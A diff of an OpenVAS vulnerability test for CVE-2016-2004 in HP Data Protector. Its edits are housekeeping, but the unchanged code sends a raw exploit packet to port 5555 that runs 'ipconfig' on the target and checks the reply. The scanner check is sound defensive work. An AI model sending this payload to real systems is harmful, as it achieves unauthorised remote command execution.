@@ -1,6 +1,6 @@
 ###############################################################################
 # OpenVAS Vulnerability Test
-# $Id: gb_hp_data_protector_encry_comm_arbi_code_exec_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
+# $Id: gb_hp_data_protector_encry_comm_arbi_code_exec_vuln.nasl 11837 2018-10-11 09:17:05Z asteins $
 #
 # HP Data Protector Encrypted Communications Arbitrary Command Execution Vulnerability
 #
@@ -30,12 +30,12 @@ CPE = "cpe:/a:hp:data_protector";
 if(description)
 {
   script_oid("1.3.6.1.4.1.25623.1.0.808540");
-  script_version("$Revision: 7203 $");
+  script_version("$Revision: 11837 $");
   script_cve_id("CVE-2016-2004");
   script_bugtraq_id(87053);
   script_tag(name:"cvss_base", value:"9.3");
   script_tag(name:"cvss_base_vector", value:"AV:N/AC:M/Au:N/C:C/I:C/A:C");
-  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
+  script_tag(name:"last_modification", value:"$Date: 2018-10-11 11:17:05 +0200 (Thu, 11 Oct 2018) $");
   script_tag(name:"creation_date", value:"2016-07-08 13:00:46 +0530 (Fri, 08 Jul 2016)");
   script_tag(name:"qod_type", value:"remote_vul");
   script_name("HP Data Protector Encrypted Communications Arbitrary Command Execution Vulnerability");
@@ -50,15 +50,12 @@ if(description)
   authenticate users, even with Encrypted Control Communications enabled.");
 
   script_tag(name:"impact", value:"Successful exploitation will allow
-  remote attackers to execute arbitrary code.
-
-  Impact Level: Application");
+  remote attackers to execute arbitrary code.");
 
   script_tag(name:"affected", value:"HPE Data Protector before 7.03_108,
   8.x before 8.15, and 9.x before 9.06.");
 
-  script_tag(name:"solution", value:"Apply the patch from below link, 
-  https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988");
+  script_tag(name:"solution", value:"Apply the patch");
 
   script_tag(name:"solution_type", value:"VendorFix");
 
@@ -74,12 +71,12 @@ if(description)
   script_require_ports("Services/hp_dataprotector", 5555);
   script_mandatory_keys("hp_data_protector/installed");
 
+  script_xref(name:"URL", value:"https://h20564.www2.hpe.com/hpsc/doc/public/display?docId=emr_na-c05085988");
   exit(0);
 }
 
 include("http_func.inc");
 include("host_details.inc");
-include("http_keepalive.inc");
 
 if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
 get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA
@@ -87,7 +84,7 @@ get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to th
 soc = open_sock_tcp( port );
 if( ! soc ) exit( 0 );
 
-##  Construct attack string (ipconfig)
+# nb: Attack string (ipconfig)
 req = raw_string( 0x00, 0x00, 0x00, 0x36, 0x32, 0x00, 0x01, 0x01,
                   0x01, 0x01, 0x01, 0x01, 0x00, 0x01, 0x00, 0x01,
                   0x00, 0x01, 0x00, 0x01, 0x01, 0x00, 0x20, 0x32,
@@ -97,24 +94,18 @@ req = raw_string( 0x00, 0x00, 0x00, 0x36, 0x32, 0x00, 0x01, 0x01,
                   0x70, 0x63, 0x6f, 0x6e, 0x66, 0x69, 0x67, 0x27,
                   0x29, 0x00 );
 
-## send the data
 send( socket:soc, data:req );
 
-## wait for 5 sec
 sleep( 5 );
 
-## Receive the data
 res = recv( socket:soc, length:4096 );
 
-## Get the response length
 len = strlen( res );
 if( ! len ) exit( 0 );
 
 data = "";
 
-## Iterate response by each characters
 for( i = 0; i < len; i = i + 1 ) {
-  ## Get only Characters from response
   if( ( ord( res[i] ) >= 61 ) ) {
     data = data + res[i];
   }
@@ -122,7 +113,6 @@ for( i = 0; i < len; i = i + 1 ) {
 
 close( soc );
 
-## Confirm the exploit
 if( "WindowsIPConfiguration" >< data && "EthernetadapterLocalAreaConnection" >< data ) {
   security_message( port:port );
   exit( 0 );
